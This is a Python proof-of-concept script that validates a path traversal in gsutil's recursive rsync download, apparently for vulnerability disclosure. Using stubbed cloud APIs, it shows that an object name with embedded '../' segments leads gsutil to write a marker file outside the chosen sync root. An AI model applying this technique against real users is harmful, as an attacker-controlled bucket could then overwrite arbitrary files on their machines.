"""Local PoC for a gsutil rsync recursive download path traversal.

The script exercises gsutil internals without contacting Google Cloud Storage:
it constructs the same destination path that `gsutil rsync -r` would use,
confirms rsync hands that path to the download machinery, and verifies that the
download completion step can write outside the chosen sync root.
"""

from __future__ import annotations

import argparse
import datetime
import json
import logging
import os
import queue
import shutil
import threading
from importlib import metadata
from pathlib import Path
from typing import Any

POC_DIR = Path(__file__).resolve().parent
EVIDENCE_DIR = POC_DIR / "evidence"
SYNC_ROOT_DIR = POC_DIR / "sync-root"
ESCAPED_MARKER_PATH = POC_DIR / "escaped" / "owned.txt"
LOG_SEPARATOR = "=" * 40
TARGET_DISTRIBUTION = "gsutil"
MALICIOUS_OBJECT_NAME = "x/../../escaped/owned.txt"
PAYLOAD = b"gsutil rsync traversal marker\n"


def _load_gsutil() -> dict[str, Any]:
    """Import gsutil internals from the active Python environment."""

    # Import gsutil at runtime so the PoC tests the installed package, not this
    # repository's downloaded source tree.
    try:
        import gslib
        from gslib.cs_api_map import ApiSelector
        from gslib.exception import InvalidUrlError
        from gslib.storage_url import StorageUrlFromString
        from gslib.third_party.storage_apitools import storage_v1_messages
        from gslib.utils import copy_helper
        from gslib.utils.posix_util import POSIXAttributes
        from gslib.utils.rsync_util import DiffAction, RsyncDiffToApply
        from gslib.commands import rsync as rsync_module
    except ModuleNotFoundError as exc:
        raise RuntimeError(
            "gsutil is not installed in this Python environment. Install the "
            "target package first, for example: python -m pip install "
            "'gsutil==5.38'."
        ) from exc
    try:
        version = metadata.version(TARGET_DISTRIBUTION)
    except metadata.PackageNotFoundError:
        version = "unknown"
    return {
        "ApiSelector": ApiSelector,
        "DiffAction": DiffAction,
        "InvalidUrlError": InvalidUrlError,
        "POSIXAttributes": POSIXAttributes,
        "RsyncDiffToApply": RsyncDiffToApply,
        "StorageUrlFromString": StorageUrlFromString,
        "copy_helper": copy_helper,
        "gslib_file": str(Path(gslib.__file__).resolve()),
        "rsync_module": rsync_module,
        "storage_v1_messages": storage_v1_messages,
        "version": version,
    }


def _realpath(path: str | Path) -> str:
    """Return the canonical filesystem path used for containment checks."""

    return os.path.realpath(os.fspath(path))


def _is_inside(base_path: str | Path, candidate_path: str | Path) -> bool:
    """Return whether candidate_path resolves under base_path."""

    base_realpath = _realpath(base_path)
    candidate_realpath = _realpath(candidate_path)
    return os.path.commonpath([base_realpath, candidate_realpath]) == base_realpath


def _object_name_with_dotdot_is_accepted(gsutil: dict[str, Any]) -> bool:
    """Check whether gsutil accepts an object name with embedded '..' parts."""

    StorageUrlFromString = gsutil["StorageUrlFromString"]
    InvalidUrlError = gsutil["InvalidUrlError"]
    try:
        StorageUrlFromString(f"gs://attacker-bucket/{MALICIOUS_OBJECT_NAME}")
    except InvalidUrlError:
        return False
    return True


def _construct_rsync_destination(
    gsutil: dict[str, Any], base_dir: Path
) -> dict[str, Any]:
    """Build the local destination path the recursive rsync flow would use."""

    StorageUrlFromString = gsutil["StorageUrlFromString"]
    copy_helper = gsutil["copy_helper"]

    base_src_url = StorageUrlFromString("gs://attacker-bucket/")
    expanded_src_url = StorageUrlFromString(
        f"gs://attacker-bucket/{MALICIOUS_OBJECT_NAME}"
    )
    base_dst_url = StorageUrlFromString(f"file://{base_dir}{os.sep}")
    # This mirrors the recursive rsync path: append the object name under the
    # local sync root. The dangerous part is that ".." is preserved.
    constructed_dst_url = copy_helper.ConstructDstUrl(
        src_url=base_src_url,
        exp_src_url=expanded_src_url,
        src_url_names_container=True,
        have_multiple_srcs=True,
        has_multiple_top_level_srcs=False,
        exp_dst_url=base_dst_url,
        have_existing_dest_subdir=False,
        recursion_requested=True,
    )
    base_realpath = _realpath(base_dir)
    destination_realpath = _realpath(constructed_dst_url.object_name)
    common_path = os.path.commonpath([base_realpath, destination_realpath])
    return {
        "expanded_src_url": expanded_src_url.url_string,
        "constructed_dst_url": constructed_dst_url.url_string,
        "raw_destination": constructed_dst_url.object_name,
        "sync_root": base_realpath,
        "resolved_destination": destination_realpath,
        "inside_sync_root": common_path == base_realpath,
    }


def _check_rsync_worker_dispatch(
    gsutil: dict[str, Any], constructed: dict[str, Any]
) -> bool:
    """Verify _RsyncFunc reaches PerformCopy with the escaped destination."""

    rsync_module = gsutil["rsync_module"]
    copy_helper = gsutil["copy_helper"]
    storage_v1_messages = gsutil["storage_v1_messages"]
    DiffAction = gsutil["DiffAction"]
    POSIXAttributes = gsutil["POSIXAttributes"]
    RsyncDiffToApply = gsutil["RsyncDiffToApply"]
    captured = {
        "perform_copy_called": False,
        "dst_escaped_base": False,
        "is_rsync": False,
    }

    class DummyApi:
        """Minimal cloud API stub required by _RsyncFunc."""

        status_queue = queue.Queue()

        def GetObjectMetadata(self, bucket_name: str, object_name: str, **kwargs: Any):
            return storage_v1_messages.Object(
                size=len(PAYLOAD),
                timeCreated=datetime.datetime.now(datetime.timezone.utc),
            )

    class DummyCommand:
        """Minimal command object with attributes expected by _RsyncFunc."""

        logger = logging.getLogger("gsutil-rsync-poc")
        dryrun = False
        source_metadata_fields: list[str] = []
        preserve_posix_attrs = False
        headers: dict[str, str] = {}
        gzip_encoded = False
        gzip_exts: list[str] = []
        stats_lock = threading.Lock()
        total_bytes_transferred = 0

    def fake_perform_copy(
        logger: Any, src_url: Any, dst_url: Any, *args: Any, **kwargs: Any
    ):
        # Stop before a real copy and record whether rsync would hand the
        # escaped local path to the normal download machinery.
        captured["perform_copy_called"] = True
        captured["dst_escaped_base"] = not _is_inside(
            constructed["sync_root"], dst_url.object_name
        )
        captured["is_rsync"] = kwargs.get("is_rsync")
        return (0, len(PAYLOAD), dst_url, None)

    original_get_cloud_api = rsync_module.GetCloudApiInstance
    original_perform_copy = copy_helper.PerformCopy
    try:
        rsync_module.GetCloudApiInstance = lambda cls, thread_state=None: DummyApi()
        copy_helper.PerformCopy = fake_perform_copy
        diff_to_apply = RsyncDiffToApply(
            constructed["expanded_src_url"],
            constructed["constructed_dst_url"],
            POSIXAttributes(),
            DiffAction.COPY,
            len(PAYLOAD),
        )
        rsync_module._RsyncFunc(DummyCommand, diff_to_apply)
    finally:
        rsync_module.GetCloudApiInstance = original_get_cloud_api
        copy_helper.PerformCopy = original_perform_copy
    return (
        captured["perform_copy_called"]
        and captured["dst_escaped_base"]
        and captured["is_rsync"] is True
    )


def _check_download_sink_write(
    gsutil: dict[str, Any], constructed: dict[str, Any]
) -> dict[str, Any]:
    """Exercise gsutil's download completion path with a local temp file."""

    StorageUrlFromString = gsutil["StorageUrlFromString"]
    copy_helper = gsutil["copy_helper"]
    ApiSelector = gsutil["ApiSelector"]
    storage_v1_messages = gsutil["storage_v1_messages"]
    logger = logging.getLogger("gsutil-rsync-poc")
    src_url = StorageUrlFromString(constructed["expanded_src_url"])
    dst_url = StorageUrlFromString(constructed["constructed_dst_url"])
    source_metadata = storage_v1_messages.Object(
        size=len(PAYLOAD),
        timeCreated=datetime.datetime.now(datetime.timezone.utc),
    )

    class DummyApi:
        """Minimal API object passed through download completion."""

        status_queue = queue.Queue()

    # The network download itself is not the bug. Create the temp file locally,
    # then let gsutil's own completion code rename it to the final path.
    download_file_name, need_to_unzip = copy_helper._GetDownloadFile(
        dst_url, source_metadata, logger
    )
    with open(download_file_name, "wb") as download_file:
        download_file.write(PAYLOAD)
    copy_helper._ValidateAndCompleteDownload(
        logger,
        src_url,
        source_metadata,
        dst_url,
        need_to_unzip,
        False,
        {},
        {},
        download_file_name,
        ApiSelector.JSON,
        len(PAYLOAD),
        DummyApi(),
        is_rsync=True,
        preserve_posix=False,
    )
    escaped_realpath = _realpath(dst_url.object_name)
    escaped_exists = os.path.exists(escaped_realpath)
    escaped_content = Path(escaped_realpath).read_bytes() if escaped_exists else b""
    return {
        "final_realpath": escaped_realpath,
        "inside_sync_root": _is_inside(constructed["sync_root"], escaped_realpath),
        "escaped_file_exists": escaped_exists,
        "escaped_file_content": escaped_content.decode("utf-8", errors="replace"),
        "payload_matches": escaped_content == PAYLOAD,
    }


def _write_evidence(
    summary: dict[str, Any], escaped_file_content: str
) -> dict[str, str]:
    """Save a compact JSON summary and the marker content written by the PoC."""

    EVIDENCE_DIR.mkdir(exist_ok=True)
    summary_path = EVIDENCE_DIR / "summary.json"
    content_path = EVIDENCE_DIR / "escaped-file-content.txt"
    # Keep evidence compact: one JSON summary plus the file content that was
    # written outside the sync root.
    content_path.write_text(escaped_file_content, encoding="utf-8")
    summary["evidence_files"] = {
        "escaped_file_content": str(content_path),
    }
    summary_path.write_text(
        json.dumps(summary, indent=2, sort_keys=True), encoding="utf-8"
    )
    return {
        "summary": str(summary_path),
        "escaped_file_content": str(content_path),
    }


def _prepare_local_paths() -> Path:
    """Create a local sync root beside this script and clear prior marker output."""

    SYNC_ROOT_DIR.mkdir(exist_ok=True)
    if ESCAPED_MARKER_PATH.exists():
        ESCAPED_MARKER_PATH.unlink()
    return SYNC_ROOT_DIR


def _cleanup_local_paths() -> None:
    """Remove only the local directories created by this PoC."""

    shutil.rmtree(SYNC_ROOT_DIR, ignore_errors=True)
    if ESCAPED_MARKER_PATH.exists():
        ESCAPED_MARKER_PATH.unlink()
    try:
        ESCAPED_MARKER_PATH.parent.rmdir()
    except OSError:
        pass


def _pass_fail(value: bool) -> str:
    """Render a boolean check in the human-readable output format."""

    return "PASS" if value else "FAIL"


def _print_human_summary(
    *,
    gsutil: dict[str, Any],
    package: dict[str, str],
    constructed: dict[str, Any],
    sink_write: dict[str, Any],
    checks: dict[str, bool],
    artifacts: dict[str, str],
    success: bool,
) -> None:
    """Print the main proof points in the same order as the PoC flow."""

    print()
    print(LOG_SEPARATOR)
    print()
    print(f"[package] gsutil {package['version']} from {gsutil['gslib_file']}")
    print()
    print(LOG_SEPARATOR)
    print()
    print(
        "[storage_url] embedded '../' accepted: "
        f"{_pass_fail(checks['object_name_with_dotdot_accepted'])}"
    )
    print(f"[construct_dst_url] raw destination: {constructed['raw_destination']}")
    print(
        "[construct_dst_url] resolved destination: "
        f"{constructed['resolved_destination']}"
    )
    print(
        "[construct_dst_url] escaped sync root: "
        f"{_pass_fail(checks['destination_resolves_outside_sync_root'])}"
    )
    print()
    print(LOG_SEPARATOR)
    print()
    print(
        "[rsync_worker] PerformCopy received escaped dst: "
        f"{_pass_fail(checks['rsync_passed_escaped_path_to_performcopy'])}"
    )
    print(
        "[download_sink] wrote escaped file: "
        f"{_pass_fail(checks['download_sink_wrote_marker_outside_sync_root'])}"
    )
    print(f"[download_sink] escaped file: {sink_write['final_realpath']}")
    print()
    print(LOG_SEPARATOR)
    print()
    print(f"[artifacts] wrote summary to {artifacts['summary']}")
    print()
    print(LOG_SEPARATOR)
    print()
    print("PoC verification passed" if success else "PoC verification failed")


def run_poc(*, cleanup: bool, log: bool) -> dict[str, Any]:
    """Run all local checks and return the machine-readable PoC summary."""

    logging.getLogger("gsutil-rsync-poc").addHandler(logging.NullHandler())
    gsutil = _load_gsutil()
    package = {
        "distribution": TARGET_DISTRIBUTION,
        "version": gsutil["version"],
    }

    # Keep the demo paths visible beside this script:
    #   ./sync-root          intended rsync destination
    #   ./escaped/owned.txt  file written outside sync-root
    base_dir = _prepare_local_paths()

    try:
        object_name_accepted = _object_name_with_dotdot_is_accepted(gsutil)
        constructed = _construct_rsync_destination(gsutil, base_dir)
        rsync_reached_performcopy = _check_rsync_worker_dispatch(gsutil, constructed)
        sink_write = _check_download_sink_write(gsutil, constructed)

        checks = {
            "object_name_with_dotdot_accepted": object_name_accepted,
            "destination_resolves_outside_sync_root": not constructed[
                "inside_sync_root"
            ],
            "rsync_passed_escaped_path_to_performcopy": rsync_reached_performcopy,
            "download_sink_wrote_marker_outside_sync_root": sink_write[
                "escaped_file_exists"
            ]
            and sink_write["payload_matches"]
            and not sink_write["inside_sync_root"],
        }
        summary = {
            "package": package,
            "malicious_object_name": MALICIOUS_OBJECT_NAME,
            "sync_root": constructed["sync_root"],
            "raw_destination": constructed["raw_destination"],
            "resolved_destination": sink_write["final_realpath"],
            "written_content": sink_write["escaped_file_content"],
            "checks": checks,
            "success": all(checks.values()),
        }
        artifacts = _write_evidence(summary, sink_write["escaped_file_content"])

        if log:
            _print_human_summary(
                gsutil=gsutil,
                package=package,
                constructed=constructed,
                sink_write=sink_write,
                checks=checks,
                artifacts=artifacts,
                success=summary["success"],
            )

        return summary
    finally:
        if cleanup:
            _cleanup_local_paths()


def main() -> int:
    """Parse command-line options and run the PoC."""

    parser = argparse.ArgumentParser(
        description="Validate gsutil rsync recursive download path traversal."
    )
    parser.add_argument(
        "--json",
        action="store_true",
        help="Print machine-readable JSON instead of human-readable logs.",
    )
    parser.add_argument(
        "--cleanup",
        action="store_true",
        help="Remove local PoC output directories after evidence is written.",
    )
    args = parser.parse_args()
    summary = run_poc(cleanup=args.cleanup, log=not args.json)
    if args.json:
        print(json.dumps(summary, indent=2, sort_keys=True))
    return 0 if summary["success"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
